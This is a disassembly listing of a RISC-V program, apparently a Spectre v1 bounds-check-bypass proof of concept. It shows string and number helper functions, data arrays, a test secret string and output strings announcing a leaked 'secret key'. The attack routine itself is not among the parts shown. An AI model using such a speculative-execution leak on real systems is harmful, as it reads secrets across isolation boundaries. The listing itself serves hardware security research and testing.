  while (n-- && *p)
    8000264e:	fd043783          	ld	a5,-48(s0)
    80002652:	fff78713          	addi	a4,a5,-1
    80002656:	fce43823          	sd	a4,-48(s0)
    8000265a:	c791                	beqz	a5,80002666 <strnlen+0x3a>
    8000265c:	fe843783          	ld	a5,-24(s0)
    80002660:	0007c783          	lbu	a5,0(a5)
    80002664:	f3e5                	bnez	a5,80002644 <strnlen+0x18>
  return p - s;
    80002666:	fe843703          	ld	a4,-24(s0)
    8000266a:	fd843783          	ld	a5,-40(s0)
    8000266e:	40f707b3          	sub	a5,a4,a5
}
    80002672:	853e                	mv	a0,a5
    80002674:	7422                	ld	s0,40(sp)
    80002676:	6145                	addi	sp,sp,48
    80002678:	8082                	ret

000000008000267a <strcmp>:

int strcmp(const char* s1, const char* s2)
{
    8000267a:	7179                	addi	sp,sp,-48
    8000267c:	f422                	sd	s0,40(sp)
    8000267e:	1800                	addi	s0,sp,48
    80002680:	fca43c23          	sd	a0,-40(s0)
    80002684:	fcb43823          	sd	a1,-48(s0)
  unsigned char c1, c2;

  do {
    c1 = *s1++;
    80002688:	fd843783          	ld	a5,-40(s0)
    8000268c:	00178713          	addi	a4,a5,1
    80002690:	fce43c23          	sd	a4,-40(s0)
    80002694:	0007c783          	lbu	a5,0(a5)
    80002698:	fef407a3          	sb	a5,-17(s0)
    c2 = *s2++;
    8000269c:	fd043783          	ld	a5,-48(s0)
    800026a0:	00178713          	addi	a4,a5,1
    800026a4:	fce43823          	sd	a4,-48(s0)
    800026a8:	0007c783          	lbu	a5,0(a5)
    800026ac:	fef40723          	sb	a5,-18(s0)
  } while (c1 != 0 && c1 == c2);
    800026b0:	fef44783          	lbu	a5,-17(s0)
    800026b4:	0ff7f793          	andi	a5,a5,255
    800026b8:	cb99                	beqz	a5,800026ce <strcmp+0x54>
    800026ba:	fef44703          	lbu	a4,-17(s0)
    800026be:	fee44783          	lbu	a5,-18(s0)
    800026c2:	0ff77713          	andi	a4,a4,255
    800026c6:	0ff7f793          	andi	a5,a5,255
    800026ca:	faf70fe3          	beq	a4,a5,80002688 <strcmp+0xe>

  return c1 - c2;
    800026ce:	fef44783          	lbu	a5,-17(s0)
    800026d2:	0007871b          	sext.w	a4,a5
    800026d6:	fee44783          	lbu	a5,-18(s0)
    800026da:	2781                	sext.w	a5,a5
    800026dc:	40f707bb          	subw	a5,a4,a5
    800026e0:	2781                	sext.w	a5,a5
}
    800026e2:	853e                	mv	a0,a5
    800026e4:	7422                	ld	s0,40(sp)
    800026e6:	6145                	addi	sp,sp,48
    800026e8:	8082                	ret

00000000800026ea <strcpy>:

char* strcpy(char* dest, const char* src)
{
    800026ea:	7179                	addi	sp,sp,-48
    800026ec:	f422                	sd	s0,40(sp)
    800026ee:	1800                	addi	s0,sp,48
    800026f0:	fca43c23          	sd	a0,-40(s0)
    800026f4:	fcb43823          	sd	a1,-48(s0)
  char* d = dest;
    800026f8:	fd843783          	ld	a5,-40(s0)
    800026fc:	fef43423          	sd	a5,-24(s0)
  while ((*d++ = *src++))
    80002700:	0001                	nop
    80002702:	fd043703          	ld	a4,-48(s0)
    80002706:	00170793          	addi	a5,a4,1
    8000270a:	fcf43823          	sd	a5,-48(s0)
    8000270e:	fe843783          	ld	a5,-24(s0)
    80002712:	00178693          	addi	a3,a5,1
    80002716:	fed43423          	sd	a3,-24(s0)
    8000271a:	00074703          	lbu	a4,0(a4)
    8000271e:	00e78023          	sb	a4,0(a5)
    80002722:	0007c783          	lbu	a5,0(a5)
    80002726:	fff1                	bnez	a5,80002702 <strcpy+0x18>
    ;
  return dest;
    80002728:	fd843783          	ld	a5,-40(s0)
}
    8000272c:	853e                	mv	a0,a5
    8000272e:	7422                	ld	s0,40(sp)
    80002730:	6145                	addi	sp,sp,48
    80002732:	8082                	ret

0000000080002734 <atol>:

long atol(const char* str)
{
    80002734:	7179                	addi	sp,sp,-48
    80002736:	f422                	sd	s0,40(sp)
    80002738:	1800                	addi	s0,sp,48
    8000273a:	fca43c23          	sd	a0,-40(s0)
  long res = 0;
    8000273e:	fe043423          	sd	zero,-24(s0)
  int sign = 0;
    80002742:	fe042223          	sw	zero,-28(s0)

  while (*str == ' ')
    80002746:	a031                	j	80002752 <atol+0x1e>
    str++;
    80002748:	fd843783          	ld	a5,-40(s0)
    8000274c:	0785                	addi	a5,a5,1
    8000274e:	fcf43c23          	sd	a5,-40(s0)
  while (*str == ' ')
    80002752:	fd843783          	ld	a5,-40(s0)
    80002756:	0007c783          	lbu	a5,0(a5)
    8000275a:	873e                	mv	a4,a5
    8000275c:	02000793          	li	a5,32
    80002760:	fef704e3          	beq	a4,a5,80002748 <atol+0x14>

  if (*str == '-' || *str == '+') {
    80002764:	fd843783          	ld	a5,-40(s0)
    80002768:	0007c783          	lbu	a5,0(a5)
    8000276c:	873e                	mv	a4,a5
    8000276e:	02d00793          	li	a5,45
    80002772:	00f70b63          	beq	a4,a5,80002788 <atol+0x54>
    80002776:	fd843783          	ld	a5,-40(s0)
    8000277a:	0007c783          	lbu	a5,0(a5)
    8000277e:	873e                	mv	a4,a5
    80002780:	02b00793          	li	a5,43
    80002784:	06f71263          	bne	a4,a5,800027e8 <atol+0xb4>
    sign = *str == '-';
    80002788:	fd843783          	ld	a5,-40(s0)
    8000278c:	0007c783          	lbu	a5,0(a5)
    80002790:	0007871b          	sext.w	a4,a5
    80002794:	02d00793          	li	a5,45
    80002798:	40f707b3          	sub	a5,a4,a5
    8000279c:	0017b793          	seqz	a5,a5
    800027a0:	0ff7f793          	andi	a5,a5,255
    800027a4:	fef42223          	sw	a5,-28(s0)
    str++;
    800027a8:	fd843783          	ld	a5,-40(s0)
    800027ac:	0785                	addi	a5,a5,1
    800027ae:	fcf43c23          	sd	a5,-40(s0)
  }

  while (*str) {
    800027b2:	a81d                	j	800027e8 <atol+0xb4>
    res *= 10;
    800027b4:	fe843703          	ld	a4,-24(s0)
    800027b8:	87ba                	mv	a5,a4
    800027ba:	078a                	slli	a5,a5,0x2
    800027bc:	97ba                	add	a5,a5,a4
    800027be:	0786                	slli	a5,a5,0x1
    800027c0:	fef43423          	sd	a5,-24(s0)
    res += *str++ - '0';
    800027c4:	fd843783          	ld	a5,-40(s0)
    800027c8:	00178713          	addi	a4,a5,1
    800027cc:	fce43c23          	sd	a4,-40(s0)
    800027d0:	0007c783          	lbu	a5,0(a5)
    800027d4:	2781                	sext.w	a5,a5
    800027d6:	fd07879b          	addiw	a5,a5,-48
    800027da:	2781                	sext.w	a5,a5
    800027dc:	873e                	mv	a4,a5
    800027de:	fe843783          	ld	a5,-24(s0)
    800027e2:	97ba                	add	a5,a5,a4
    800027e4:	fef43423          	sd	a5,-24(s0)
  while (*str) {
    800027e8:	fd843783          	ld	a5,-40(s0)
    800027ec:	0007c783          	lbu	a5,0(a5)
    800027f0:	f3f1                	bnez	a5,800027b4 <atol+0x80>
  }

  return sign ? -res : res;
    800027f2:	fe442783          	lw	a5,-28(s0)
    800027f6:	2781                	sext.w	a5,a5
    800027f8:	c791                	beqz	a5,80002804 <atol+0xd0>
    800027fa:	fe843783          	ld	a5,-24(s0)
    800027fe:	40f007b3          	neg	a5,a5
    80002802:	a019                	j	80002808 <atol+0xd4>
    80002804:	fe843783          	ld	a5,-24(s0)
}
    80002808:	853e                	mv	a0,a5
    8000280a:	7422                	ld	s0,40(sp)
    8000280c:	6145                	addi	sp,sp,48
    8000280e:	8082                	ret

Disassembly of section .rodata:

0000000080002810 <.rodata>:
    80002810:	2221                	addiw	tp,tp,8
    80002812:	547e                	lw	s0,252(sp)
    80002814:	6968                	ld	a0,208(a0)
    80002816:	54734973          	0x54734973
    8000281a:	6568                	ld	a0,200(a0)
    8000281c:	6142                	ld	sp,16(sp)
    8000281e:	7962                	ld	s2,56(sp)
    80002820:	6f42                	ld	t5,16(sp)
    80002822:	72656d6f          	jal	s10,80058f48 <_end+0x3da88>
    80002826:	6554                	ld	a3,136(a0)
    80002828:	00007473          	csrrci	s0,ustatus,0
    8000282c:	0000                	unimp
    8000282e:	0000                	unimp
    80002830:	3d3d                	addiw	s10,s10,-17
    80002832:	3d3d                	addiw	s10,s10,-17
    80002834:	3d3d                	addiw	s10,s10,-17
    80002836:	3d3d                	addiw	s10,s10,-17
    80002838:	3d3d                	addiw	s10,s10,-17
    8000283a:	3d3d                	addiw	s10,s10,-17
    8000283c:	3d3d                	addiw	s10,s10,-17
    8000283e:	3d3d                	addiw	s10,s10,-17
    80002840:	203d                	0x203d
    80002842:	6854                	ld	a3,144(s0)
    80002844:	7369                	lui	t1,0xffffa
    80002846:	6920                	ld	s0,80(a0)
    80002848:	20612073          	csrs	0x206,sp
    8000284c:	4f50                	lw	a2,28(a4)
    8000284e:	666f2043          	fmadd.q	ft0,ft10,ft6,fa2,rdn
    80002852:	7320                	ld	s0,96(a4)
    80002854:	6570                	ld	a2,200(a0)
    80002856:	65727463          	bleu	s7,tp,80002e9e <dummyMem+0x29e>
    8000285a:	765f 2031 4228      	0x42282031765f
    80002860:	6172                	ld	sp,280(sp)
    80002862:	636e                	ld	t1,216(sp)
    80002864:	2068                	fld	fa0,192(s0)
    80002866:	646e6f43          	0x646e6f43
    8000286a:	7469                	lui	s0,0xffffa
    8000286c:	6f69                	lui	t5,0x1a
    8000286e:	206e                	fld	ft0,216(sp)
    80002870:	63656843          	fmadd.d	fa6,fa0,fs6,fa2,unknown
    80002874:	7942206b          	0x7942206b
    80002878:	6170                	ld	a2,192(a0)
    8000287a:	20297373          	csrrci	t1,hedeleg,18
    8000287e:	3d3d                	addiw	s10,s10,-17
    80002880:	3d3d                	addiw	s10,s10,-17
    80002882:	3d3d                	addiw	s10,s10,-17
    80002884:	3d3d                	addiw	s10,s10,-17
    80002886:	3d3d                	addiw	s10,s10,-17
    80002888:	3d3d                	addiw	s10,s10,-17
    8000288a:	3d3d                	addiw	s10,s10,-17
    8000288c:	3d3d                	addiw	s10,s10,-17
    8000288e:	3d3d                	addiw	s10,s10,-17
    80002890:	3d3d                	addiw	s10,s10,-17
    80002892:	3d3d                	addiw	s10,s10,-17
    80002894:	3d3d                	addiw	s10,s10,-17
    80002896:	203d                	0x203d
    80002898:	000a                	c.slli	zero,0x2
    8000289a:	0000                	unimp
    8000289c:	0000                	unimp
    8000289e:	0000                	unimp
    800028a0:	6874                	ld	a3,208(s0)
    800028a2:	2065                	0x2065
    800028a4:	72636573          	csrrsi	a0,0x726,6
    800028a8:	7465                	lui	s0,0xffff9
    800028aa:	6b20                	ld	s0,80(a4)
    800028ac:	7965                	lui	s2,0xffff9
    800028ae:	6920                	ld	s0,80(a0)
    800028b0:	73253a73          	csrrc	s4,0x732,a0
    800028b4:	0a20                	addi	s0,sp,280
    800028b6:	0000                	unimp
    800028b8:	3b305b1b          	0x3b305b1b
    800028bc:	333b3233          	0x333b3233
    800028c0:	6d32                	ld	s10,264(sp)
    800028c2:	6176                	ld	sp,344(sp)
    800028c4:	6464                	ld	s1,200(s0)
    800028c6:	5b72                	lw	s6,60(sp)
    800028c8:	3025                	0x3025
    800028ca:	3031                	0x3031
    800028cc:	5d70                	lw	a2,124(a0)
    800028ce:	203a                	fld	ft0,392(sp)
    800028d0:	746e6177          	0x746e6177
    800028d4:	2528                	fld	fa0,72(a0)
    800028d6:	3a202963          	0x3a202963
    800028da:	2820                	fld	fs0,80(s0)
    800028dc:	6968                	ld	a0,208(a0)
    800028de:	2d74                	fld	fa3,216(a0)
    800028e0:	6974                	ld	a3,208(a0)
    800028e2:	656d                	lui	a0,0x1b
    800028e4:	53412c73          	csrrs	s8,0x534,sp
    800028e8:	4349                	li	t1,18
    800028ea:	68632c43          	fmadd.s	fs8,ft6,ft6,fa3,rdn
    800028ee:	7261                	lui	tp,0xffff8
    800028f0:	2029                	0x2029
    800028f2:	203d                	0x203d
    800028f4:	2e31                	addiw	t3,t3,12
    800028f6:	2528                	fld	fa0,72(a0)
    800028f8:	756c                	ld	a1,232(a0)
    800028fa:	202c                	fld	fa1,64(s0)
    800028fc:	6425                	lui	s0,0x9
    800028fe:	202c                	fld	fa1,64(s0)
    80002900:	6325                	lui	t1,0x9
    80002902:	2029                	0x2029
    80002904:	2e32                	fld	ft8,264(sp)
    80002906:	2528                	fld	fa0,72(a0)
    80002908:	756c                	ld	a1,232(a0)
    8000290a:	202c                	fld	fa1,64(s0)
    8000290c:	6425                	lui	s0,0x9
    8000290e:	202c                	fld	fa1,64(s0)
    80002910:	6325                	lui	t1,0x9
    80002912:	1b29                	addi	s6,s6,-22
    80002914:	000a6d5b          	0xa6d5b
    80002918:	3b305b1b          	0x3b305b1b
    8000291c:	333b3233          	0x333b3233
    80002920:	6d31                	lui	s10,0xc
    80002922:	6176                	ld	sp,344(sp)
    80002924:	6464                	ld	s1,200(s0)
    80002926:	5b72                	lw	s6,60(sp)
    80002928:	3025                	0x3025
    8000292a:	3031                	0x3031
    8000292c:	5d70                	lw	a2,124(a0)
    8000292e:	203a                	fld	ft0,392(sp)
    80002930:	746e6177          	0x746e6177
    80002934:	2528                	fld	fa0,72(a0)
    80002936:	3a202963          	0x3a202963
    8000293a:	2820                	fld	fs0,80(s0)
    8000293c:	6968                	ld	a0,208(a0)
    8000293e:	2d74                	fld	fa3,216(a0)
    80002940:	6974                	ld	a3,208(a0)
    80002942:	656d                	lui	a0,0x1b
    80002944:	53412c73          	csrrs	s8,0x534,sp
    80002948:	4349                	li	t1,18
    8000294a:	68632c43          	fmadd.s	fs8,ft6,ft6,fa3,rdn
    8000294e:	7261                	lui	tp,0xffff8
    80002950:	2029                	0x2029
    80002952:	203d                	0x203d
    80002954:	2e31                	addiw	t3,t3,12
    80002956:	2528                	fld	fa0,72(a0)
    80002958:	756c                	ld	a1,232(a0)
    8000295a:	202c                	fld	fa1,64(s0)
    8000295c:	6425                	lui	s0,0x9
    8000295e:	202c                	fld	fa1,64(s0)
    80002960:	6325                	lui	t1,0x9
    80002962:	2029                	0x2029
    80002964:	2e32                	fld	ft8,264(sp)
    80002966:	2528                	fld	fa0,72(a0)
    80002968:	756c                	ld	a1,232(a0)
    8000296a:	202c                	fld	fa1,64(s0)
    8000296c:	6425                	lui	s0,0x9
    8000296e:	202c                	fld	fa1,64(s0)
    80002970:	6325                	lui	t1,0x9
    80002972:	1b29                	addi	s6,s6,-22
    80002974:	000a6d5b          	0xa6d5b
    80002978:	636d                	lui	t1,0x1b
    8000297a:	6379                	lui	t1,0x1e
    8000297c:	656c                	ld	a1,200(a0)
    8000297e:	0000                	unimp
    80002980:	696d                	lui	s2,0x1b
    80002982:	736e                	ld	t1,248(sp)
    80002984:	7274                	ld	a3,224(a2)
    80002986:	7465                	lui	s0,0xffff9
	...
    80002990:	6d49                	lui	s10,0x12
    80002992:	6c70                	ld	a2,216(s0)
    80002994:	6d65                	lui	s10,0x19
    80002996:	6e65                	lui	t3,0x19
    80002998:	2074                	fld	fa3,192(s0)
    8000299a:	616d                	addi	sp,sp,240
    8000299c:	6e69                	lui	t3,0x1a
    8000299e:	2928                	fld	fa0,80(a0)
    800029a0:	202c                	fld	fa1,64(s0)
    800029a2:	6f66                	ld	t5,88(sp)
    800029a4:	000a216f          	jal	sp,800a49a4 <_end+0x894e4>
    800029a8:	7325                	lui	t1,0xfffe9
    800029aa:	3d20                	fld	fs0,120(a0)
    800029ac:	2520                	fld	fs0,72(a0)
    800029ae:	646c                	ld	a1,200(s0)
    800029b0:	000a                	c.slli	zero,0x2
    800029b2:	0000                	unimp
    800029b4:	0000                	unimp
    800029b6:	0000                	unimp
    800029b8:	6e28                	ld	a0,88(a2)
    800029ba:	6c75                	lui	s8,0x1d
    800029bc:	296c                	fld	fa1,208(a0)
    800029be:	0000                	unimp
    800029c0:	f73a                	sd	a4,424(sp)
    800029c2:	ffff                	0xffff
    800029c4:	f924                	sd	s1,112(a0)
    800029c6:	ffff                	0xffff
    800029c8:	f916                	sd	t0,176(sp)
    800029ca:	ffff                	0xffff
    800029cc:	f924                	sd	s1,112(a0)
    800029ce:	ffff                	0xffff
    800029d0:	f924                	sd	s1,112(a0)
    800029d2:	ffff                	0xffff
    800029d4:	f924                	sd	s1,112(a0)
    800029d6:	ffff                	0xffff
    800029d8:	f924                	sd	s1,112(a0)
    800029da:	ffff                	0xffff
    800029dc:	f716                	sd	t0,424(sp)
    800029de:	ffff                	0xffff
    800029e0:	f924                	sd	s1,112(a0)
    800029e2:	ffff                	0xffff
    800029e4:	f924                	sd	s1,112(a0)
    800029e6:	ffff                	0xffff
    800029e8:	f6b4                	sd	a3,104(a3)
    800029ea:	ffff                	0xffff
    800029ec:	f72a                	sd	a0,424(sp)
    800029ee:	ffff                	0xffff
    800029f0:	f924                	sd	s1,112(a0)
    800029f2:	ffff                	0xffff
    800029f4:	f6be                	sd	a5,360(sp)
    800029f6:	ffff                	0xffff
    800029f8:	f6c8                	sd	a0,168(a3)
    800029fa:	ffff                	0xffff
    800029fc:	f6c8                	sd	a0,168(a3)
    800029fe:	ffff                	0xffff
    80002a00:	f6c8                	sd	a0,168(a3)
    80002a02:	ffff                	0xffff
    80002a04:	f6c8                	sd	a0,168(a3)
    80002a06:	ffff                	0xffff
    80002a08:	f6c8                	sd	a0,168(a3)
    80002a0a:	ffff                	0xffff
    80002a0c:	f6c8                	sd	a0,168(a3)
    80002a0e:	ffff                	0xffff
    80002a10:	f6c8                	sd	a0,168(a3)
    80002a12:	ffff                	0xffff
    80002a14:	f6c8                	sd	a0,168(a3)
    80002a16:	ffff                	0xffff
    80002a18:	f6c8                	sd	a0,168(a3)
    80002a1a:	ffff                	0xffff
    80002a1c:	f924                	sd	s1,112(a0)
    80002a1e:	ffff                	0xffff
    80002a20:	f924                	sd	s1,112(a0)
    80002a22:	ffff                	0xffff
    80002a24:	f924                	sd	s1,112(a0)
    80002a26:	ffff                	0xffff
    80002a28:	f924                	sd	s1,112(a0)
    80002a2a:	ffff                	0xffff
    80002a2c:	f924                	sd	s1,112(a0)
    80002a2e:	ffff                	0xffff
    80002a30:	f924                	sd	s1,112(a0)
    80002a32:	ffff                	0xffff
    80002a34:	f924                	sd	s1,112(a0)
    80002a36:	ffff                	0xffff
    80002a38:	f924                	sd	s1,112(a0)
    80002a3a:	ffff                	0xffff
    80002a3c:	f924                	sd	s1,112(a0)
    80002a3e:	ffff                	0xffff
    80002a40:	f924                	sd	s1,112(a0)
    80002a42:	ffff                	0xffff
    80002a44:	f924                	sd	s1,112(a0)
    80002a46:	ffff                	0xffff
    80002a48:	f924                	sd	s1,112(a0)
    80002a4a:	ffff                	0xffff
    80002a4c:	f924                	sd	s1,112(a0)
    80002a4e:	ffff                	0xffff
    80002a50:	f924                	sd	s1,112(a0)
    80002a52:	ffff                	0xffff
    80002a54:	f924                	sd	s1,112(a0)
    80002a56:	ffff                	0xffff
    80002a58:	f924                	sd	s1,112(a0)
    80002a5a:	ffff                	0xffff
    80002a5c:	f924                	sd	s1,112(a0)
    80002a5e:	ffff                	0xffff
    80002a60:	f924                	sd	s1,112(a0)
    80002a62:	ffff                	0xffff
    80002a64:	f924                	sd	s1,112(a0)
    80002a66:	ffff                	0xffff
    80002a68:	f924                	sd	s1,112(a0)
    80002a6a:	ffff                	0xffff
    80002a6c:	f924                	sd	s1,112(a0)
    80002a6e:	ffff                	0xffff
    80002a70:	f924                	sd	s1,112(a0)
    80002a72:	ffff                	0xffff
    80002a74:	f924                	sd	s1,112(a0)
    80002a76:	ffff                	0xffff
    80002a78:	f924                	sd	s1,112(a0)
    80002a7a:	ffff                	0xffff
    80002a7c:	f924                	sd	s1,112(a0)
    80002a7e:	ffff                	0xffff
    80002a80:	f924                	sd	s1,112(a0)
    80002a82:	ffff                	0xffff
    80002a84:	f924                	sd	s1,112(a0)
    80002a86:	ffff                	0xffff
    80002a88:	f924                	sd	s1,112(a0)
    80002a8a:	ffff                	0xffff
    80002a8c:	f924                	sd	s1,112(a0)
    80002a8e:	ffff                	0xffff
    80002a90:	f924                	sd	s1,112(a0)
    80002a92:	ffff                	0xffff
    80002a94:	f924                	sd	s1,112(a0)
    80002a96:	ffff                	0xffff
    80002a98:	f924                	sd	s1,112(a0)
    80002a9a:	ffff                	0xffff
    80002a9c:	f924                	sd	s1,112(a0)
    80002a9e:	ffff                	0xffff
    80002aa0:	f924                	sd	s1,112(a0)
    80002aa2:	ffff                	0xffff
    80002aa4:	f924                	sd	s1,112(a0)
    80002aa6:	ffff                	0xffff
    80002aa8:	f924                	sd	s1,112(a0)
    80002aaa:	ffff                	0xffff
    80002aac:	f924                	sd	s1,112(a0)
    80002aae:	ffff                	0xffff
    80002ab0:	f924                	sd	s1,112(a0)
    80002ab2:	ffff                	0xffff
    80002ab4:	f924                	sd	s1,112(a0)
    80002ab6:	ffff                	0xffff
    80002ab8:	f924                	sd	s1,112(a0)
    80002aba:	ffff                	0xffff
    80002abc:	f924                	sd	s1,112(a0)
    80002abe:	ffff                	0xffff
    80002ac0:	f76a                	sd	s10,424(sp)
    80002ac2:	ffff                	0xffff
    80002ac4:	f86a                	sd	s10,48(sp)
    80002ac6:	ffff                	0xffff
    80002ac8:	f924                	sd	s1,112(a0)
    80002aca:	ffff                	0xffff
    80002acc:	f924                	sd	s1,112(a0)
    80002ace:	ffff                	0xffff
    80002ad0:	f924                	sd	s1,112(a0)
    80002ad2:	ffff                	0xffff
    80002ad4:	f924                	sd	s1,112(a0)
    80002ad6:	ffff                	0xffff
    80002ad8:	f924                	sd	s1,112(a0)
    80002ada:	ffff                	0xffff
    80002adc:	f924                	sd	s1,112(a0)
    80002ade:	ffff                	0xffff
    80002ae0:	f924                	sd	s1,112(a0)
    80002ae2:	ffff                	0xffff
    80002ae4:	f75e                	sd	s7,424(sp)
    80002ae6:	ffff                	0xffff
    80002ae8:	f924                	sd	s1,112(a0)
    80002aea:	ffff                	0xffff
    80002aec:	f924                	sd	s1,112(a0)
    80002aee:	ffff                	0xffff
    80002af0:	f8b2                	sd	a2,112(sp)
    80002af2:	ffff                	0xffff
    80002af4:	f8ba                	sd	a4,112(sp)
    80002af6:	ffff                	0xffff
    80002af8:	f924                	sd	s1,112(a0)
    80002afa:	ffff                	0xffff
    80002afc:	f924                	sd	s1,112(a0)
    80002afe:	ffff                	0xffff
    80002b00:	f786                	sd	ra,488(sp)
    80002b02:	ffff                	0xffff
    80002b04:	f924                	sd	s1,112(a0)
    80002b06:	ffff                	0xffff
    80002b08:	f8aa                	sd	a0,112(sp)
    80002b0a:	ffff                	0xffff
    80002b0c:	f924                	sd	s1,112(a0)
    80002b0e:	ffff                	0xffff
    80002b10:	f924                	sd	s1,112(a0)
    80002b12:	ffff                	0xffff
    80002b14:	f8dc                	sd	a5,176(s1)
    80002b16:	ffff                	0xffff

Disassembly of section .data:

0000000080002b40 <array1>:
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
    80002b40:	0201                	addi	tp,tp,0
    80002b42:	06050403          	lb	s0,96(a0) # 1b060 <_tbss_end+0x1afdc>
    80002b46:	0a090807          	0xa090807
    80002b4a:	0e0d0c0b          	0xe0d0c0b
    80002b4e:	0000100f          	fence.i
	...

Disassembly of section .sdata:

0000000080002be0 <array1_sz>:
uint64_t array1_sz = 16;
    80002be0:	0010                	0x10
    80002be2:	0000                	unimp
    80002be4:	0000                	unimp
	...

0000000080002be8 <secretString>:
char* secretString = "!\"~ThisIsTheBabyBoomerTest";
    80002be8:	2810                	fld	fa2,16(s0)
    80002bea:	8000                	0x8000
    80002bec:	0000                	unimp
	...

Disassembly of section .bss:

0000000080002c00 <dummyMem>:
	...

0000000080016c00 <unused1>:
	...

0000000080016c40 <unused2>:
	...

0000000080016c80 <array2>:
	...

000000008001ac80 <results.2909>:
	...

000000008001b480 <counters>:
	...

000000008001b490 <counter_names>:
	...

000000008001b4a0 <count.2896>:
    8001b4a0:	0000                	unimp
	...

000000008001b4a4 <sense.2895>:
    8001b4a4:	0000                	unimp
	...

Disassembly of section .tbss:

000000008001b4c0 <_tls_data>:
	...

Disassembly of section .debug_info:

0000000000000000 <.debug_info>:
       0:	00000d93          	li	s11,0
       4:	0004                	0x4
       6:	0000                	unimp
       8:	0000                	unimp
       a:	0108                	addi	a0,sp,128
       c:	02a8                	addi	a0,sp,328
       e:	0000                	unimp
      10:	000c                	0xc
      12:	0000                	unimp
      14:	a400                	fsd	fs0,8(s0)
      16:	0004                	0x4
      18:	4800                	lw	s0,16(s0)
      1a:	0010                	0x10
      1c:	0080                	addi	s0,sp,64
      1e:	0000                	unimp
      20:	8600                	0x8600
      22:	0005                	c.nop	1
	...
      2c:	0200                	addi	s0,sp,256
      2e:	0601                	addi	a2,a2,0
      30:	03c5                	addi	t2,t2,17
      32:	0000                	unimp
      34:	00003503          	ld	a0,0(zero) # 0 <_tdata_begin>
      38:	0300                	addi	s0,sp,384
      3a:	00003f2b          	0x3f2b
      3e:	0200                	addi	s0,sp,256
      40:	0801                	addi	a6,a6,0
      42:	000003c3          	fmadd.s	ft7,ft0,ft0,ft0,rne
      46:	0202                	slli	tp,tp,0x0
      48:	e805                	bnez	s0,78 <buf.2990+0x38>
      4a:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
      4e:	0702                	slli	a4,a4,0x0
      50:	00000233          	add	tp,zero,zero
      54:	0404                	addi	s1,sp,512
      56:	6905                	lui	s2,0x1
      58:	746e                	ld	s0,248(sp)
      5a:	0200                	addi	s0,sp,256
      5c:	0704                	addi	s1,sp,896
      5e:	007d                	c.nop	31
      60:	0000                	unimp
      62:	00009803          	lh	a6,0(ra)
      66:	0300                	addi	s0,sp,384
      68:	00006d67          	0x6d67
      6c:	0200                	addi	s0,sp,256
      6e:	0508                	addi	a0,sp,640
      70:	000000f3          	0xf3
      74:	00038803          	lb	a6,0(t2)
      78:	0300                	addi	s0,sp,384
      7a:	7f69                	lui	t5,0xffffa
      7c:	0000                	unimp
      7e:	0200                	addi	s0,sp,256
      80:	0708                	addi	a0,sp,896
      82:	0078                	addi	a4,sp,12
      84:	0000                	unimp
      86:	0802                	slli	a6,a6,0x0
      88:	ee05                	bnez	a2,c0 <_tbss_end+0x3c>
      8a:	0000                	unimp
      8c:	0200                	addi	s0,sp,256
      8e:	0410                	addi	a2,sp,512
      90:	032d                	addi	t1,t1,11
      92:	0000                	unimp
      94:	0003a403          	lw	s0,0(t2)
      98:	0400                	addi	s0,sp,512
      9a:	00005407          	0x5407
      9e:	0300                	addi	s0,sp,384
      a0:	00000373          	0x373
      a4:	2c05                	addiw	s8,s8,1
      a6:	006d                	c.nop	27
      a8:	0000                	unimp
      aa:	0004d303          	lhu	t1,0(s1)
      ae:	0500                	addi	s0,sp,640
      b0:	6d72                	ld	s10,280(sp)
      b2:	0000                	unimp
      b4:	0300                	addi	s0,sp,384
      b6:	0580                	addi	s0,sp,704
      b8:	0000                	unimp
      ba:	9105                	srli	a0,a0,0x21
      bc:	006d                	c.nop	27
      be:	0000                	unimp
      c0:	8105                	srli	a0,a0,0x1
      c2:	0002                	c.slli	zero,0x0
      c4:	0600                	addi	s0,sp,768
      c6:	0165                	addi	sp,sp,25
      c8:	0000005b          	0x5b
      cc:	0406                	slli	s0,s0,0x1
      ce:	a605                	j	3ee <_tbss_end+0x36a>
      d0:	000000eb          	0xeb
      d4:	00027b07          	0x27b07
      d8:	0500                	addi	s0,sp,640
      da:	c0a8                	sw	a0,64(s1)
      dc:	0000                	unimp
      de:	0700                	addi	s0,sp,896
      e0:	0201                	addi	tp,tp,0
      e2:	0000                	unimp
      e4:	a905                	j	514 <_tbss_end+0x490>
      e6:	000000eb          	0xeb
      ea:	0800                	addi	s0,sp,16
      ec:	0000003f 000000fb 	0xfb0000003f
      f4:	7f09                	lui	t5,0xfffe2
      f6:	0000                	unimp
      f8:	0300                	addi	s0,sp,384
      fa:	0a00                	addi	s0,sp,272
      fc:	0508                	addi	a0,sp,640
      fe:	00011ca3          	sh	zero,25(sp)
     102:	0b00                	addi	s0,sp,400
     104:	048e                	slli	s1,s1,0x3
     106:	0000                	unimp
     108:	a505                	j	728 <_tbss_end+0x6a4>
     10a:	0054                	addi	a3,sp,4
     10c:	0000                	unimp
     10e:	0b00                	addi	s0,sp,400
     110:	0496                	slli	s1,s1,0x5
     112:	0000                	unimp
     114:	aa05                	j	244 <_tbss_end+0x1c0>
     116:	00cc                	addi	a1,sp,68
     118:	0000                	unimp
     11a:	0004                	0x4
     11c:	00041003          	lh	zero,0(s0) # ffffffffffff9000 <_end+0xffffffff7ffddb40>
     120:	0500                	addi	s0,sp,640
     122:	0000fbab          	0xfbab
     126:	0300                	addi	s0,sp,384
     128:	01b8                	addi	a4,sp,200
     12a:	0000                	unimp
     12c:	af05                	j	85c <_tbss_end+0x7d8>
     12e:	0094                	addi	a3,sp,64
     130:	0000                	unimp
     132:	080c                	addi	a1,sp,16
     134:	00052503          	lw	a0,0(a0)
     138:	0700                	addi	s0,sp,896
     13a:	5b19                	li	s6,-26
     13c:	0000                	unimp
     13e:	0d00                	addi	s0,sp,656
     140:	01c9                	addi	gp,gp,18
     142:	0000                	unimp
     144:	0720                	addi	s0,sp,904
     146:	0001922f          	0x1922f
     14a:	0b00                	addi	s0,sp,400
     14c:	0431                	addi	s0,s0,12
     14e:	0000                	unimp
     150:	01923107          	fld	ft2,25(tp) # ffffffffffff8019 <_end+0xffffffff7ffdcb59>
     154:	0000                	unimp
     156:	0e00                	addi	s0,sp,784
     158:	6b5f 0700 5432      	0x543207006b5f
     15e:	0000                	unimp
     160:	0800                	addi	s0,sp,16
     162:	0004790b          	0x4790b
     166:	0700                	addi	s0,sp,896
     168:	5432                	lw	s0,44(sp)
     16a:	0000                	unimp
     16c:	0c00                	addi	s0,sp,528
     16e:	0001ac0b          	0x1ac0b
